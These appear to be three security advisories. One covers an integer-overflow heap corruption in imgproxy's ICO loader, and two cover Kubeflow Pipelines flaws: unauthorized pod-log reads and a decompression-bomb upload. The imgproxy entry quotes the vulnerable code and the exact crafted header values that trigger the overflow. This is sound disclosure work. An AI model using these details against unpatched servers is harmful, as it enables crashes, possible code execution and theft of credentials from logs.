### GHSA-hff9-5pqw-6w9f — imgproxy has integer overflow in imgproxy ICO loader that causes denial of service and may permit remote code execution
- Aliases:  | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: CRITICAL
- CWE: CWE-122, CWE-190
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Affected Go/github.com/imgproxy/imgproxy/v3: introduced:4.0.0 fixed:4.0.16
- Affected Go/github.com/imgproxy/imgproxy/v2: introduced:4.0.0 fixed:4.0.16
- Affected Go/github.com/imgproxy/imgproxy: introduced:4.0.0 fixed:4.0.16

## Summary

The ICO loader allocates `data_size + BMP_FILE_HEADER_LEN` bytes after reading a 32-bit attacker-controlled `data_size`. For `data_size > UINT32_MAX - BMP_FILE_HEADER_LEN`, the addition wraps before allocation. imgproxy then writes the ICO prefix and reads up to the original declared size starting 14 bytes into the undersized allocation. A network client can turn this heap overflow into remote denial of service or remote code execution.

## Technical details

The vulnerable path is in [`vips/icoload.c` at commit `f4fedbb`](https://github.com/imgproxy/imgproxy/blob/f4fedbb5c7f6684e7a8e0a9bb7e666773f3c40c0/vips/icoload.c#L154-L164):

```c
uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
void *actual_data = data + BMP_FILE_HEADER_LEN;

if (vips_foreign_load_read_full(ico->source, actual_data, data_size) <= 0) {
  vips_error("vips_foreign_load_ico_header", "unable to read ICO image data from the source");
  return -1;
}
```

The crafted directory entry contains:

```text
data_size       = 0xfffffff5 (4294967285)
data_offset     = 22
BMP header size = 14
32-bit result   = (0xfffffff5 + 14) mod 2^32 = 3
```

The allocation is therefore three bytes. `actual_data` points 14 bytes after the allocation base. The fixture contains 64 bytes after the ICO header, so the source callback copies those 64 bytes to an invalid destination before it can report that the declared multi-gigabyte payload is incomplete.

The complete source-to-sink path is:

1. Attacker-controlled bytes begin with the ICO magic `00 00 01 00`.
2. imgproxy identifies the source as ICO and dispatches it to `vips_icoload_source_go`.
3. `vips_foreign_load_ico_header` reads the attacker-controlled `data_size`.
4. The 32-bit addition wraps, and `VIPS_MALLOC` receives the value three.
5. `vips_foreign_load_read_full` passes the original `data_size` to the Go source callback.
6. The callback writes the available source bytes through the invalid pointer, corrupting the process heap.

## Impact

A crafted image can terminate the imgproxy process handling it or potentially lead to remote code execution due to heap corruption.

- https://github.com/imgproxy/imgproxy/commit/a821b6a4cb07a1bf2bb9077431d1c1e734d79917 [WEB]
- https://github.com/imgproxy/imgproxy [PACKAGE]
- https://github.com/imgproxy/imgproxy/releases/tag/v4.0.16 [WEB]

### GHSA-wg5q-x4j9-qm54 — Kubeflow Pipelines: Run-log endpoint permits unauthorized access to pod logs
- Aliases: CVE-2026-118759 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-200, CWE-862
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected Go/github.com/kubeflow/pipelines: introduced:0 fixed:0.0.0-20260904182349-be4723e33727
- Affected Go/github.com/kubeflow/pipelines:  versions: 1.7.0-alpha.3

## Summary

The Kubeflow Pipelines API server's `GET /apis/v1alpha1/runs/{run_id}/nodes/{node_id}/log` handler retrieves logs without authorizing the caller against the selected run. A caller who can reach the backend and knows a victim run ID and a suitable pod or node identifier can read live or archived logs using the API server's permissions.

For live logs, the vulnerable handler also accepts the supplied node ID as a pod name in the run's namespace without verifying that the pod belongs to the run. Depending on the API server's pod-log permissions, a known run ID can therefore permit reading the `main` container logs of an unrelated pod in that namespace. Logs may contain sensitive workload data or credentials.

The affected handler does not authenticate the request itself. An external authentication gate or network policy can restrict reachability; public ingress exposure and unauthenticated enumeration of run IDs are not assumed.

## Remediation

Upgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.

[PR #13684](https://github.com/kubeflow/pipelines/pull/13684) authorizes the caller with the `readLog` verb before retrieving live or archived logs. For live logs, it also verifies that the pod's `pipeline/runid` label matches the requested run. Custom Kubernetes roles must grant `readLog` on `runs` in the `pipelines.kubeflow.org` API group; the bundled viewer and editor roles include it. Shared read access alone does not grant log access.

Until upgrading, restrict access to the backend log endpoint. Focused regression tests cover authorization denial, HTTP identity propagation, pod/run mismatch, archive retrieval, and cancellation; no new deployed-cluster end-to-end test was performed for this assessment.

## Credit

[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Nayyar ([@naruto-lgtm](https://github.com/naruto-lgtm)) authored the fix in #13684.

[@patchmyday](https://github.com/patchmyday), [@thesecguy45](https://github.com/thesecguy45), [@VitoCrl](https://github.com/VitoCrl), [@Grg0rry](https://github.com/Grg0rry), [@arpitjain099](https://github.com/arpitjain099), and [@BrianWillows](https://github.com/BrianWillows) made later submissions concerning the run-log authorization gap. **MUTEDCYBERSECURITY S.L.** separately reported a synthetic two-tenant reproduction, including the unrelated-pod log path.

### GHSA-8fmv-6rg5-5924 — Kubeflow Pipelines: Pipeline archive upload allows decompression bomb to exhaust server memory
- Aliases: CVE-2026-118761 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-409
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Go/github.com/kubeflow/pipelines: introduced:0 fixed:0.0.0-20260831164314-ba9ae72cc860
- Affected Go/github.com/kubeflow/pipelines:  versions: 1.7.0-alpha.3

## Summary

The Kubeflow Pipelines API server decompresses uploaded pipeline archives without adequately bounding expanded data in affected versions. A small ZIP or gzip-compressed tar archive can consume disproportionately large amounts of memory while the server locates or reads the pipeline file, potentially exhausting API-server resources and interrupting service.

Multipart pipeline and pipeline-version upload processing decompresses the archive before namespace authorization, so a caller who can reach those endpoints does not need a successful pipeline-create authorization decision to trigger the issue. External authentication and network controls can restrict reachability. URL-import handlers authorize before fetching and decompressing a remote archive.

The amount of expansion needed to exhaust memory depends on deployment resource limits and concurrent activity; no particular archive is guaranteed to crash every deployment.

## Remediation

Upgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.

[PR #14171](https://github.com/kubeflow/pipelines/pull/14171) bounds compressed input and extracted pipeline data. [PR #14186](https://github.com/kubeflow/pipelines/pull/14186) strengthens the total tar traversal budget, including metadata and skipped entries. The 2.18 release also includes configurable upload and specification limits; operators should review the shipped settings and resource budget. These controls address pipeline archive amplification and do not establish general HTTP-body, temporary-disk, concurrency, or CPU limits.

Until upgrading, restrict access to upload and import endpoints and apply deployment-level request and resource controls. A compressed upload-size limit alone does not prevent decompression amplification. Regression tests cover compressed input, selected-entry boundaries, and tar traversal budgets; no deployed-server OOM test was performed for this assessment.

## Credit

[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Ayush Gupta ([@Ayush-kathil](https://github.com/Ayush-kathil)) authored the archive fixes in #14171 and #14186, with Jeff Spahr ([@jeffspahr](https://github.com/jeffspahr)) contributing regression coverage to #14171.

[@BrianWillows](https://github.com/BrianWillows) later submitted a mixed report that included source analysis of pipeline-archive decompression.
